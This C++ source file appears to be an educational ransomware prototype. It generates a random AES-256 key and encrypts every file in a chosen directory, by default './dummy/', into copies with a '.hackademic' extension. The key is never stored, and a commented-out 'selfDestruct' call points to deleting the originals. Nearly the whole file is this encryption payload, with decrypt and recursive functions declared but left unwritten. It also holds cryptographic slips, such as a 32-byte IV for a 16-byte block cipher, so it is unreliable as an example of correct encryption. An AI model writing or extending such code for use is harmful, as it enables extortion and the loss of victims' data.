#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>

#include <openssl/rand.h>
#include <openssl/evp.h>

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define EXTENSION       ".hackademic"

void aesEncryptFile(const std::string filenameIn, unsigned char* key) {
    // Open fin and fout
    std::string filenameOut = filenameIn + EXTENSION;
    std::ifstream fin(filenameIn, std::ios::binary);  // No need for .close() because ifstream and ofstream
    std::ofstream fout(filenameOut, std::ios::binary);// automatically close themselves when they go out of scope
    if (!fin or !fout) {
        std::cerr << " └─[☓] Error opening file.\n";
        return;
    }
    
    // Encrypt
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER *aes256cbc = EVP_CIPHER_fetch(NULL, "AES-256-CBC", NULL);
    unsigned char iv[AES_KEY_SIZE];
    RAND_bytes(iv, AES_KEY_SIZE);
    if ( !ctx or !(*iv) or !EVP_EncryptInit_ex(ctx, aes256cbc, NULL, key, iv) ) {
        std::cerr << " └─[☓] Error initializing encryption.\n";
        EVP_CIPHER_CTX_free(ctx);
        EVP_CIPHER_free(aes256cbc);
        return;
    }
    fout.write((char*)iv, AES_KEY_SIZE);

    unsigned char buffer[1024];
    unsigned char encryptedBuffer[1024 + AES_BLOCK_SIZE];
    int bytesRead, encryptedLen;

    while ((bytesRead = fin.readsome((char*)buffer, sizeof(buffer))) > 0) {
        EVP_EncryptUpdate(ctx, encryptedBuffer, &encryptedLen, buffer, bytesRead);
        fout.write((char*)encryptedBuffer, encryptedLen);
    }

    EVP_EncryptFinal_ex(ctx, encryptedBuffer, &encryptedLen);
    fout.write((char*)encryptedBuffer, encryptedLen);
    // fin.selfDestruct();

    EVP_CIPHER_CTX_free(ctx);
    EVP_CIPHER_free(aes256cbc);
    std::cout << " └─[✓] Done.\n";
}

void aesDecryptFile(const std::string filename, unsigned char* key);

void aesEncryptRecursively(const std::string path, unsigned char* key);
void aesDecryptRecursively(const std::string path, unsigned char* key);

int main(int argc, char *argv[]) {
    std::string path;
    if (argc == 1) {
        std::cout << "[/] Enter a path for encryption (./dummy/): ";
        getline(std::cin, path);
        if (path == "")
            path = "./dummy/";
    } else
        path = argv[1];
    
    unsigned char key[AES_KEY_SIZE];
    RAND_bytes(key, AES_KEY_SIZE);
    std::cout << "[*] Generated key\n";

    for (const auto &entry : std::filesystem::directory_iterator(path)) {
        std::string filename = entry.path();
        if (!std::filesystem::is_directory(filename)) {
            std::cout << "[#] Encrypting " << filename << "...\n";
            aesEncryptFile(filename, key);
        }
    }
    std::cout << "[#] Encrypting " << "NONEXISTENT.txt...\n";
    aesEncryptFile("NONEXISTENT.txt", key);
    return 0;
}

